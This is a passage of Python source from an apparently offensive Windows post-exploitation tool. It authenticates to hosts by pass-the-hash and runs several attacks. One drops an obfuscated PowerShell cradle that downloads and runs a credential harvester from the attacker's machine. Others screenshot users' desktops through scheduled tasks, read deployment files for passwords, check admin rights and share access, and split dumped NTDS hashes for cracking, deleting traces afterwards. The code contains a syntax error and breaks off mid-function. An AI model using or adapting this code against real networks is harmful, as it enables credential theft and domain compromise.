					print(colored("[+]Creating powershell script in /tmp/mimikittenz.ps1",'green'))
					fout=open('/tmp/mimikittenz.ps1','w')

					line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/b')); cathod > c:\\kittenz_creds.txt"
					fout.write(line)
					fout.close()
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimikittenz.ps1\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\mimikittenz.ps1 -Verb RunAs\" 2>/dev/null")
					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get kittenz_creds.txt\' 2>/dev/null")
					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\kittenz_creds.txt c:\\mimikittenz.ps1\" 2>/dev/null")
					if os.path.isfile(outputpath+host+"/kittenz_creds.txt"):
						print(colored("[+]kittenz_creds.txt file found",'green'))
						if not os.path.isfile('/usr/bin/iconv'):
							print(colored("[-]Cannot find iconv",'red'))
							exit(1)
						else:
							print(colored("[+]Found iconv",'green'))
							os.system("iconv -f utf-16 -t utf-8 "+outputpath+host+"/kittenz_creds.txt > "+outputpath+host+"/kittenz_creds1.txt")
							# one liner from here: http://lifepluslinux.blogspot.com/2014/09/convert-little-endian-utf-16-to-ascii.html
							print(colored("[+]Basic parsed output:",'green'))

							if 'PatternName' in open(outputpath+host+"/kittenz_creds1.txt").read():
								print(colored("[+]Looks like we have found some creds.....","yellow"))
								os.system("cat "+outputpath+host+"/kittenz_creds1.txt")

							print(colored("[+]Mimikatz output stored in "+outputpath+host+"/kittenz_creds1.txt",'yellow'))
							print(colored("[+]Clearing up.....","yellow"))
							os.system("rm /tmp/mimikittenz.ps1")
							print(colored("[+]Stopping web server",'green'))
							server_process.terminate()
					else:
						print(colored("[-]kittenz_creds.txt file not found",'red'))

				except OSError:
					print(colored("[-]Something went wrong here...",'red'))

			#Routine starts Session Goper @arvanaghi
			if session_gopher in yesanswers or session_gopher=="AV":
				try:
					print(colored("\n[+]Running SessionGopher",'blue'))

					shellscript = "SessionGopher.ps1"
					InvokeFunction = "Invoke-SessionGopher"
					FunctionCommand = ""

					cps(shellscript,session_gopher,InvokeFunction,FunctionCommand,host,"false")

					sys.exit()
				except OSError:
					print(colored("[-]Something went wrong here...",'red'))

			#Routine will screen shot all logged on users desktops
			if screenshot in yesanswers:
				loggeduser1=""
				loggeduser = []
				activeusers=0

				try:
					print(colored("[+]Attempting to Screenshot Desktop",'green'))

					res = os.stat(path+host+"/logged_on_users.txt").st_size > 3

					if res==True:
						try:
							u = open(path+host+"/logged_on_users.txt").read().splitlines()

							if len(loggeduser)==0:
								for n in u:
									if n:
										if not "USERNAME" in n:
											if "Active" in n:
												loggeduser1=n.lstrip()
												endofloggeduser=loggeduser1.find(" ")
												loggeduser.append(loggeduser1[:endofloggeduser])


							if len(loggeduser)==0:
								print(colored("[-]No logged on Active Users found: "+host,'red'))
								exit(1)

						except IOError as e:
							print("I/O error({0}): {1}".format(e.errno, e.strerror))
					else:
						print(colored("[-]No logged on users found: "+host,'red'))
						exit(1)

					for x in xrange(0,len(loggeduser)):

						fout=open('/tmp/sshot.bat','w')
						fout.write('SchTasks /Create /SC DAILY /RU '+loggeduser[x]+' /TN "RedSnarf_ScreenShot" /TR "cmd.exe /c start /min c:\\rsc.exe c:\\windows\\temp\\'+loggeduser[x]+"_"+host+'.png" /ST 23:36 /f\n')
						fout.write('SchTasks /run /TN "RedSnarf_ScreenShot" \n')
						fout.close()

						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+os.getcwd()+"; put rsc.exe\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print(proc.communicate()[0])
						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/temp -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get "+loggeduser[x]+"_"+host+".png"+"\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print(proc.communicate()[0])

						if os.path.isfile(outputpath+host+"/"+loggeduser[x]+"_"+host+".png"):
							print(colored("[+]Screenshot file saved as "+outputpath+host+"/"+loggeduser[x]+"_"+host+".png",'yellow'))
						else:
							print(colored("[-]Screenshot not found, try again..",'red'))

						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\windows\\temp\\"+loggeduser[x]+"_"+host+".png\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print(proc.communicate()[0])
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\rsc.exe c:\\sshot.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)

						time.sleep(4)

						fout=open('/tmp/sshot_del.bat','w')
						fout.write('SchTasks /delete /TN "RedSnarf_ScreenShot" /f')
						fout.close()

						proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put sshot_del.bat\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)

						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system --uninstall \/\/"+host+" \"c:\\sshot_del.bat \" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print(proc.communicate()[0])

						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\sshot_del.bat\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)

						time.sleep(4)

				except OSError:
					print(colored("[-]Something went wrong running screenshot...",'red'))

			#Routine will look for unattended installation files and check for passwords
			if unattend in yesanswers:

				try:
					#Check for 64 Bit Version Values of VMWare DeployData
					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					deploydata=proc.communicate()[0]
					deploydata=deploydata[108:].rstrip()

					deploydata=str(bytearray.fromhex(deploydata))
					print(deploydata)

					if "<EncryptedValue>" and  "guestcustutil.exe" in deploydata:
						print(colored("\n[+]VMware Specific ",'green'))
						print(colored("[+]Registry values indicate this machine may have been deployed via a VMware Template",'yellow'))
						print(colored("[+]Values for <EncryptedValue> and guestcustutil.exe were found in DeployData",'yellow'))
						print(colored("[+]You may wish to double check the unattend.xml file which can be found in the path indicated below...",'yellow'))
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\Wow6432Node\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print(proc.communicate()[0])

					#Check for 32 Bit Version Values of VMWare DeployData
					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"DeployData\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					deploydata=proc.communicate()[0]
					deploydata=deploydata[108:].rstrip()

					deploydata=str(bytearray.fromhex(deploydata))

					if "<EncryptedValue>" and  "guestcustutil.exe" in deploydata:
						print(colored("\n[+]VMware Specific ",'green'))
						print(colored("[+]Registry values indicate this machine may have been deployed via a VMware Template",'yellow'))
						print(colored("[+]Values for <EncryptedValue> and guestcustutil.exe were found in DeployData",'yellow'))
						print(colored("[+]You may wish to double check the unattend.xml file which can be found in the path indicated below...",'yellow'))
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" 'cmd /C reg.exe \"QUERY\" \"HKLM\Software\VMware, Inc.\Guest Customization\" /v \"SysprepFilePath\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						print(proc.communicate()[0])

					print(colored("\n[+]Attempting to Find Unattend/Sysprep Files",'green'))

					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.inf\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory sysprep -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get unattend.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther/unattend -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)

					if os.path.isfile(outputpath+host+"/unattend.xml"):
						print(colored("[+]" +outputpath+host+"/unattend.xml file found, grepping for username, password, group",'green'))

						os.chdir(outputpath+host)

						os.system("grep --color='auto' -i \"<Password>\" unattend.xml")
						os.system("grep --color='auto' -i \"<Username>\" unattend.xml")
						os.system("grep --color='auto' -i \"<Name>\" unattend.xml")
						os.system("grep --color='auto' -i \"<Group>\" unattend.xml")

						os.system("grep --color='auto' -i \"=</Value>\" unattend.xml > unattend_b64values.txt")

						if os.path.isfile(outputpath+host+"/unattend_b64values.txt"):
							print(colored("\n[+]Decoding Base64 Encoded Values",'green'))
							with open(outputpath+host+"/unattend_b64values.txt") as f:
								content = f.readlines()

							for x in content:
								print("B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow'))

					if os.path.isfile(outputpath+host+"/Unattended.xml"):
						print(colored("[+]Unattended.xml file found, grepping for username, password, group",'green'))

						os.chdir(outputpath+host)

						os.system("grep --color='auto' -i \"<Password>\" Unattendedxml")
						os.system("grep --color='auto' -i \"<Username>\" Unattended.xml")
						os.system("grep --color='auto' -i \"<Name>\" Unattended.xml")
						os.system("grep --color='auto' -i \"<Group>\" Unattended.xml")

						os.system("grep --color='auto' -i \"=</Value>\" Unattended.xml > unattended_b64values.txt")

						if os.path.isfile(outputpath+host+"/unattended_b64values.txt"):
							print(colored("\n[+]Decoding Base64 Encoded Values",'green'))
							with open(outputpath+host+"/unattended_b64values.txt") as f:
								content = f.readlines()

							for x in content:
								print("B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow'))


					if os.path.isfile(outputpath+host+"/sysprep.xml"):
						print(colored("[+]sysprep.xml file found, grepping for username, password, group",'green'))

						os.chdir(outputpath+host)

						os.system("grep --color='auto' -i \"<Password>\" sysprep.xml")
						os.system("grep --color='auto' -i \"<Username>\" sysprep.xml")
						os.system("grep --color='auto' -i \"<Name>\" sysprep.xml")
						os.system("grep --color='auto' -i \"<Group>\" sysprep.xml")

						os.system("grep --color='auto' -i \"=</Value>\" sysprep.xml > sysprep_b64values.txt")

						if os.path.isfile(outputpath+host+"/sysprep_b64values.txt"):
							print(colored("\n[+]Decoding Base64 Encoded Values",'green'))
							with open(outputpath+host+"/sysprep_b64values.txt") as f:
								content = f.readlines()

							for x in content:
								print("B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow'))

					if os.path.isfile(outputpath+host+"/sysprep.inf"):
						print(colored("[+]sysprep.xml file found",'green'))

						os.chdir(outputpath+host)

						os.system("grep --color='auto' -i AdminPassword sysprep.inf")

				except OSError:
					print(colored("[-]Something went wrong running looking for files...",'red'))

#Routine handles Crtl+C
def signal_handler(signal, frame):
		print(colored("\nCtrl+C pressed.. aborting...",'red'))
		logging.error("Ctrl+C pressed.. aborting...")
		sys.exit()

#Routine completes some basic sanity checks
def syschecks():
	winexe = os.system("which pth-winexe > /dev/null")
	if winexe != 0:
		print(colored("[-]pth-winexe not installed",'red'))
		logging.error("[-]pth-winexe not installed")
		exit(1)
	else:
		print(colored("[+]pth-winexe installed",'green'))
		logging.info("[+]pth-winexe installed")
	smb = os.system("which /usr/bin/pth-smbclient > /dev/null")
	if smb != 0:
		print(colored("[-]/usr/bin/pth-smbclient not installed",'red'))
		logging.error("[-]/usr/bin/pth-smbclient not installed")
		exit(1)
	else:
		print(colored("[+]pth-smbclient installed",'green'))
		logging.info("[+]pth-smbclient installed")
	c = os.path.isdir(creddump7path)
	if not c:
		print(colored("[-]creddump7 not installed in "+creddump7path,'red'))
		print(colored("[-]Clone from https://github.com/Neohapsis/creddump7",'yellow'))
		print(colored("[-]going to try and clone it now for you....., you're welcome",'yellow'))
		logging.warning("[-]going to try and clone it now for you....., you're welcome")
		os.system("git clone https://github.com/Neohapsis/creddump7 /opt/creddump7")
		exit(1)
	else:
		print(colored("[+]creddump7 found",'green'))
		logging.info("[+]creddump7 found")

#Routine checks to see if remote machine is a DC
def checkport():
	host=targets[0]
	scanv = subprocess.Popen(["nmap", "-sS", "-p88,389,3268","--open", str(host)], stdout=subprocess.PIPE,stderr=subprocess.PIPE).communicate()[0]
	logging.debug("DC Port scan results")
	logging.debug(scanv)
	if not "open" in scanv:
		print(colored("[-]Are you sure this is a Domain Controller?\n",'red'))
		logging.error("[-]Are you sure this is a Domain Controller?")
		exit(1)
	else:
		print(colored("[+]Looks like a Domain Controller",'green'))
		logging.info("[+]Looks like a Domain Controller")

#Routine checks for local admins
def get_local_admins(ip,username,password,domain):

	LocalAdmin=False

	if username=="":
		print(colored("[-]Username is missing..",'red'))
		exit(1)
	else:
		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net localgroup administrators' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
		stdout_value = proc.communicate()[0]
		if username.upper() in stdout_value.upper():
			LocalAdmin = True

	return LocalAdmin

#Routine checks for domain admins
def get_domain_admins(ip,username,password,domain):
	#Account active               Yes
	DomainAdmin=False

	if username=="":
		print(colored("[-]Username is missing..",'red'))
		logging.error("[-]Username is missing..")
		exit(1)
	else:
		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net group \"Domain Admins\" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
		stdout_value = proc.communicate()[0]

		if username.upper() in stdout_value.upper():
			DomainAdmin = True
			#If account is domain admin try and get status.
			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net user '"+username+"' /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
			stdout_value = proc.communicate()[0]
			if not "Account active               Yes" in stdout_value:
				print(colored("[-]Account is either disabled or locked...",'red'))

	return DomainAdmin

def run():
	user=args.username.strip()
	passw=args.password.strip()

	for target in targets:

		host=str(target)

		passwd=''

		if passw[len(passw)-3:] ==':::':
			lmhash, nthash ,s1,s2,s3 = passw.split(':')
			passwd=lmhash+":"+nthash
		else:
			lmhash = ''
			nthash = ''

		if nthash=='':
			passwd=passw

		now = time.strftime("%c")
		## date and time representation

		print('User: '+user)
		logging.info("[+]Using the following username: "+user)
		print('Password: '+passw)
		print('Domain Name: '+domain_name)
		print(colored("[+]Scan Start " + time.strftime("%c"),'blue'))
		try:

			#Check to see whether server accepts SMBV1
			smbClient = SMBConnection(host, host, sess_port=int('445'),timeout=10,preferredDialect=SMB_DIALECT)
			dialect = smbClient.getDialect()
			if dialect == SMB_DIALECT:
				print(colored("[!]WARNING - SMBv1 Accepted",'red'))
				smbClient.logoff()

			#Initiate Proper Connection here
			smbClient = SMBConnection(host, host, sess_port=int('445'),timeout=10)

			dialect = smbClient.getDialect()
			if dialect == SMB_DIALECT:
				print(colored("[!]WARNING - SMBv1 dialect used",'red'))
			elif dialect == SMB2_DIALECT_002:
				print("[+]SMBv2.0 dialect used")
			elif dialect == SMB2_DIALECT_21:
				print("[+]SMBv2.1 dialect used")
			else:
				print("[+]SMBv3.0 dialect used"_

			#Check for SMB Signing
			#print(smbClient.isSigningRequired())
			#if smbClient.isSigningRequired():
			#	print("[+]SMB Signing Required")
			#else:
			#	print("[+]SMB Signing Not Required")

			x=smbClient.login(user, passwd, domain_name, lmhash, nthash)

			if x==None or x==True:

				if smbClient.getServerDNSDomainName()!=domain_name:
					print(colored("[!]"+host+" Command line Domain name ",'red')+domain_name+colored(" does not match detected Domain Name ",'red')	+smbClient.getServerDNSDomainName())

				if smbClient.getServerOS().find('Windows')!=-1 and smbClient.isGuestSession()==0:
					print(colored("[+]"+host+" Creds OK, User Session Granted",'green'))
					logging.info("[+]"+host+" Creds OK, User Session Granted")
					#Check if account is a local admin
					if get_local_admins(host,user,passwd,domain_name):
						print(colored("[+]"+host+" Account is a Local Admin",'green'))
						logging.info("[+]"+host+" Account is a Local Admin")
					else:
						print(colored("[-]"+host+" Account not found in Local Admin Group",'yellow'))
						logging.warning("[-]"+host+" Account not found in Local Admin Group")

					#Check if account is a Domain Admin
					if get_domain_admins(host,user,passwd,domain_name):
						print(colored("[+]"+host+" Account is a Domain Admin",'green') + colored(" Game Over!",'red'))
						logging.warning("[+]"+host+" Account is a Domain Admin")
					else:
						print(colored("[-]"+host+" Account not found in Domain Admin Group",'yellow'))
						logging.warning("[-]"+host+" Account not found in Domain Admin Group")

					if args.quick_validate in noanswers:
						#Display Shares
						print(colored("[+]"+host+" Enumerating Remote Shares",'green'))
						print(colored("[+]"+host+" Shares Found",'yellow'))
						resp = smbClient.listShares()

						#Write share names to file and print to screen
						if not os.path.isdir(outputpath+targets[0]):
							proc = subprocess.Popen("mkdir "+outputpath+targets[0], stdout=subprocess.PIPE,shell=True)
							stdout_value = proc.communicate()[0]

						#Open file handler
						thefile = open(outputpath+targets[0]+'/shares.txt', 'a')

						#Add to file when we started enumerating shares and using which account
						thefile.write("Shares Enumerated at "+time.strftime("%c")+'\n')
						thefile.write("User Account used to Enumerate Shares "+user+'\n')

						for i in range(len(resp)):
							canWrite = False

							try:
								#Get share name from list
								share=resp[i]['shi1_netname'][:-1]

								try:
									#NOTE - SYSVOL IS OFTEN READ/WRITE BUT REQUIRES RAISED PRIVS FOR DELETE
									#FOR THIS REASON AN EXCEPTION IS RAISED MAKING SYSVOL READ ONLY
									#COMMENT OUT NEXT TO LINES TO REMOVE EXCEPTIOIN
									if share=="SYSVOL":
										raise Exception('SYSVOL')

									#Try and create test_dir in share
									smbClient.createDirectory(share, "test_dir")

									#Try and delete directory created in share
									try:
										smbClient.deleteDirectory(share, "test_dir")
									except:
										print(colored('[!]Unable to remove test directory at \\\\%s\\%s\\%s, please remove manually' % (host, share, "test_dir"),'red'))

									#Set canWrite flag to true
									#Print write status to screen and file
									canWrite = True
									print("["+colored("+",'green')+"]"+share+",READ/WRITE")
									thefile.write(share+",READ/WRITE"+'\n')

								#Catch any exceptions which mean we probably don't have write privs
								except Exception as e:
									sys.stdout.flush()
									canWrite = False

								#If we can't write check to see if we can read
								if canWrite==False:
									readable = smbClient.listPath(resp[i]['shi1_netname'][:-1], "*")

									if readable:
										#NOTE TO REMOVE SYSVOL EXCEPTION
										#UNCOMMENT BELOW AND COMMENT OUT IF/ELSE

										#print("[+]"+share+",READ ONLY")
										#thefile.write(share+",READ ONLY"+'\n')

										if share=="SYSVOL":
											#Print SYSVOL share exception message to screen and file if we can read
											print("["+colored("+",'blue')+"]"+share+",READ/WRITE SKIPPED")
											thefile.write(share+",READ/WRITE SKIPPED"+'\n')
										else:
											#Print Read Only permissions message to screen and file
											print("["+colored("+",'yellow')+"]"+share+",READ ONLY")
											thefile.write(share+",READ ONLY"+'\n')

							#If we can't read or write assume we have no access
							#Print No Access to screen and file
							except Exception as e:
								print("["+colored("+",'red')+"]"+share+",NO ACCESS")
								thefile.write(share+",NO ACCESS"+'\n')

						#Close file handler
						thefile.close()

						#Check to see if share file exists, if so print status to screen
						if os.path.isfile(outputpath+targets[0]+'/shares.txt'):
							print(colored("[+]"+host+" Shares written to "+outputpath+targets[0]+'/shares.txt','yellow'))

						print(colored("[+]"+host+" Enumerating Local Drives",'green'))
						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'fsutil fsinfo drives' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						drives = proc.communicate()[0]
						print(colored("[+]"+host+" Local " + drives.strip(),'yellow'))

						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" 'net use' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
						mappedshares = proc.communicate()[0]
						if not "There are no entries in the list" in mappedshares:
							print(colored("[+]"+host+" Mapped drives detected",'green'))
							for line in mappedshares.splitlines():
								if "\\" in line:
									print(colored("[+]"+line[13:len(line)],'yellow'))

						#Start dump thread
						t = Thread(target=datadump, args=(user,passw,host,outputpath,smbClient.getServerOS()))
						t.start()
						t.join()

				elif smbClient.getServerOS().find('Windows')==-1:
					print(colored("[-]"+host+" MS Windows not detected...",'red'))
				elif smbClient.isGuestSession() ==1:
					print(colored("[-]"+host+" Guest Session detected...",'red'))
				else:
					print(colored("[-]"+host+" Something went wrong...\n",'red'))
					print(colored("[-]"+host+" Can you ping the remote device?... ",'yellow'))
					print(colored("[-]"+host+" Have you checked the LocalAccessToken Registry Setting?... (-rL y will create a .bat dropper file)",'yellow'))
					print(colored("[-]"+host+" Have you checked the FilterAdministratorToken Registry Setting?... (-rF y will create a .bat dropper file)",'yellow'))

		except Exception as e:
			#Catch the login error and display exception
			if "STATUS_PASSWORD_EXPIRED" in str(e):
				print(colored(e,'yellow')+colored(" - Could be worth a closer look...",'red'))
				if remotetargets[0:3]=='ip=':
					response = raw_input("[+]Do you want to try and connect with rdesktop to set a new password? Y/N (N): ")
					if response in yesanswers:
						os.system("rdesktop "+host+" 2>/dev/null")
			else:
				print(colored(e,'red'))
				logging.exception(e)

#Routine parses dumped hashes to make reporting/cracking easier
def hashparse(hashfolder,hashfile):
#Split hashes into NT and LM
	file2parse=hashfolder+hashfile

	lst_nthash=[]
	lst_ntuser=[]

	lst_lmhash=[]
	lst_lmuser=[]

	if file2parse!='':
		print(colored('\n[+]Parsing hashes...','yellow'))
		if os.path.isfile(file2parse):
			with open(file2parse,'r') as inifile:
				data=inifile.read()
				hash_list=data.splitlines()

				#If we're parsing the drsuapi file it also includes the local hashes which we need to filter out
				#Domain hashes start after the line below
				#[+] Using the DRSUAPI method to get NTDS.DIT secrets
				for x in xrange(1,len(hash_list)):
					if hash_list[x]=='[+] Using the DRSUAPI method to get NTDS.DIT secrets':
						hl_st=x
						break
					else:
						hl_st=0

				for y in xrange(hl_st,len(hash_list)):

					pwdumpmatch = re.compile('^(\S+?):(.*?:?)([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):.*?:.*?:\s*$')
					pwdump = pwdumpmatch.match(hash_list[y])

					if pwdump:
						splitter = hash_list[y].split(":")
						username=splitter[0]

						#Remove machine accounts
						if username.find('$')==-1:
							lm=splitter[2]

							if lm=='aad3b435b51404eeaad3b435b51404ee':
								lst_nthash.append(hash_list[y]+'\n');
								lst_ntuser.append(username+'\n');
							else:
								lst_lmhash.append(hash_list[y]+'\n');
								lst_lmuser.append(username+'\n');

				lst_nthash=list(set(lst_nthash))
				fout=open(hashfolder+'/nt.txt','w')
				for h in lst_nthash:
					fout.write(h)
				fout.close()

				lst_ntuser=list(set(lst_ntuser))
				fout=open(hashfolder+'/nt_usernames.txt','w')
				for u in lst_ntuser:
					fout.write(u)
				fout.close()

				lst_lmhash=list(set(lst_lmhash))
				fout=open(hashfolder+'/lm.txt','w')
				for h in lst_lmhash:
					fout.write(h)
				fout.close()

				lst_lmuser=list(set(lst_lmuser))
				fout=open(hashfolder+'/lm_usernames.txt','w')
				for u in lst_lmuser:
					fout.write(u)
				fout.close()

		if os.path.isfile(hashfolder+'/nt.txt'):
			with open(hashfolder+'/nt.txt') as f:
				print(colored('[+]'+str(sum(1 for _ in f))+' NT hashes written to '+hashfolder+'/nt.txt\n','green'))

		if os.path.isfile(hashfolder+'/nt_usernames.txt'):
			with open(hashfolder+'/nt_usernames.txt') as f:
				print(colored('[+]'+str(sum(1 for _ in f))+' NT usernames written to '+hashfolder+'/nt_usernames.txt\n','green'))

		if os.path.isfile(hashfolder+'/lm.txt'):
			with open(hashfolder+'/lm.txt') as f:
				print(colored('[+]'+str(sum(1 for _ in f))+' LM hashes written to '+hashfolder+'/lm.txt\n','red'))

		if os.path.isfile(hashfolder+'/lm_usernames.txt'):
			with open(hashfolder+'/lm_usernames.txt') as f:
				print(colored('[+]'+str(sum(1 for _ in f))+' LM usernames written to '+hashfolder+'/lm_usernames.txt\n','red'))


#Routine gets the enabled/disabled status of a user
def userstatus(targetpath,dcip,inputfile,dom_name):
	e=''

	try:
		conn = ldap.initialize('ldap://' + dcip)
		conn.protocol_version = 3
		conn.set_option(ldap.OPT_REFERRALS, 0)
		conn.simple_bind_s(user+'@'+dom_name, passw)
	except ldap.LDAPError as e:
		if 'desc' in e.message:
			print(colored("[-]LDAP error: %s" % e.message['desc'],'red'))
			sys.exit()
	else:
		print(e)

	domain = dom_name

	splitter = domain.split(".")
	base=''
	for part in splitter:
		base = base + "dc=" + part + ","

	if os.path.isfile(targetpath+str(dcip)+'/'+inputfile):
		with open(targetpath+str(dcip)+'/'+inputfile,'r') as inifile:
			data=inifile.read()
			lm_usernames_list=data.splitlines()
			for lmnames in lm_usernames_list:

				if lmnames.find(dom_name)!=-1:
					mark=str(lmnames[(len(dom_name)+1):len(lmnames)])
				else:
					mark=lmnames

				criteria = "(&(objectClass=User)(sAMAccountName="+mark+"))"
				attributes = ['userAccountControl', 'sAMAccountName']

				results =conn.search_s(str(base[:-1]), ldap.SCOPE_SUBTREE, criteria, attributes)
				da_list=[]

				for result in results:
					result_dn = result[0]
					result_attrs = result[1]

					if mark!='':
						if "sAMAccountName" in result_attrs:
							for Account in result_attrs["sAMAccountName"]:
								UserName = str(result_attrs["sAMAccountName"])
								AccStatus = str(result_attrs["userAccountControl"])

								if UserName[2:-2]==mark:
									if str(AccStatus[2:-2]) != "514" and str(AccStatus[2:-2]) != "532480" and str(AccStatus[2:-2]) != "4096" and str(AccStatus[2:-2]) != "66050" and str(AccStatus[2:-2]) != "546" and str(AccStatus[2:-2]) != "66082" and str(AccStatus[2:-2]) != "262658" and str(AccStatus[2:-2]) != "262690" and str(AccStatus[2:-2]) != "328194" and str(AccStatus[2:-2]) != "328226":
										fout=open(targetpath+str(dcip)+'/'+'enabled_'+inputfile,'a')
										fout.write(mark+'\n')
										fout.close()
									else:
										fout=open(targetpath+str(dcip)+'/'+'disabled_'+inputfile,'a')
										fout.write(mark+'\n')
										fout.close()


	if os.path.isfile(targetpath+str(dcip)+'/'+'enabled_'+inputfile):
		with open(targetpath+str(dcip)+'/'+'enabled_'+inputfile) as f:
			print(colored("[+]"+str(sum(1 for _ in f))+" enabled accounts written to "+targetpath+str(dcip)+'/'+'enabled_'+inputfile,'green'))

	if os.path.isfile(targetpath+str(dcip)+'/'+'disabled_'+inputfile):
		with open(targetpath+str(dcip)+'/'+'disabled_'+inputfile) as f:
			print(colored("[+]"+str(sum(1 for _ in f))+" disabled accounts written to "+targetpath+str(dcip)+'/'+'disabled_'+inputfile,'green'))

#Function handles file upload
def upload(s,path,command):
    s.send(command)
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(4096)
        print(colored("[+]Sending data",'yellow'))
        while packet != '':
            s.send(packet)
            packet = f.read(4096)
        s.send('DONE')
        f.close()

    else: # the file doesn't exist
        s.send('[-]Unable to find out the file')

    print(colored("[+]File uploaded to cwd on remote machine",'green'))

#Function handles file download
def transfer(conn,command,filename,remoteip,dp):
    if dp=="":
